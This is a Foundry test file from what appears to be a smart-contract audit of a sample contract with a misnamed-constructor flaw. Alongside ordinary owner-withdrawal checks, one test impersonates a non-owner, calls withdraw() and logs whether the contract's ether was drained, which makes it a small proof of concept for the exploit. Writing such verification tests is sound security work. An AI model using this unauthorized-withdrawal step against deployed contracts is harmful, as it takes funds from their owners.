// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/incorrect_constructor_name2.sol";

contract Audit_StateVariableTest is Test {
    Missing public missing;
    address owner = makeAddr("owner");
    address nonOwner = makeAddr("nonOwner");

    function setUp() public {
        vm.prank(owner);
        missing = new Missing();
        vm.deal(address(missing), 1 ether); // Fund the contract with 1 ether
    }

    function test_OwnerCanWithdraw() public {
        uint initialBalance = owner.balance;
        
        vm.prank(owner);
        missing.withdraw();

        assertEq(
            owner.balance, 
            initialBalance + 1 ether,
            "Withdrawal should transfer funds to owner"
        );
        assertEq(
            address(missing).balance, 
            0, 
            "Contract balance should be empty after withdrawal"
        );
    }

    function test_NonOwnerCannotWithdraw() public {
        vm.prank(nonOwner);
        vm.expectRevert(); // Expect revert for non-owner
        missing.withdraw();
    }

    // New test function for vulnerability verification
    function test_VulnerabilityDifferentialVerification() public {
        // Pre-trigger state
        console.log("--- BEFORE-Trigger State ---");
        uint256 initialContractBalance = address(missing).balance;
        uint256 initialNonOwnerBalance = nonOwner.balance;
        console.log("Contract ETH balance:", initialContractBalance);
        console.log("Non-owner ETH balance:", initialNonOwnerBalance);

        console.log("--- Trigger Critical Action ---");
        vm.prank(nonOwner);
        (bool success, ) = address(missing).call(abi.encodeWithSignature("withdraw()"));
        console.log("Non-owner withdrawal attempted - Result:", success ? "Success" : "Failure");

        // Post-trigger state
        console.log("--- AFTER-Trigger State ---");
        uint256 finalContractBalance = address(missing).balance;
        uint256 finalNonOwnerBalance = nonOwner.balance;
        console.log("Contract ETH balance:", finalContractBalance);
        console.log("Non-owner ETH balance:", finalNonOwnerBalance);

        // Differential verification
        bool fundsTaken = finalContractBalance == 0;
        bool fundsReceived = finalNonOwnerBalance == initialNonOwnerBalance + initialContractBalance;
        bool vulnerabilityExploited = success && fundsTaken && fundsReceived;
        
        console.log("Verification Results:");
        console.log("- Contract funds withdrawn:", fundsTaken ? "YES" : "NO");
        console.log("- Funds received by non-owner:", fundsReceived ? "YES" : "NO");
        console.log("--- Final Verdict ---");

        // Final vulnerability verdict
        if (vulnerabilityExploited) {
            console.log("Vulnerability Exists: Non-owner successfully withdrew contract funds");
        } else {
            console.log("Vulnerability not Exist: Non-owner unable to withdraw or incorrect state change");
        }
    }
}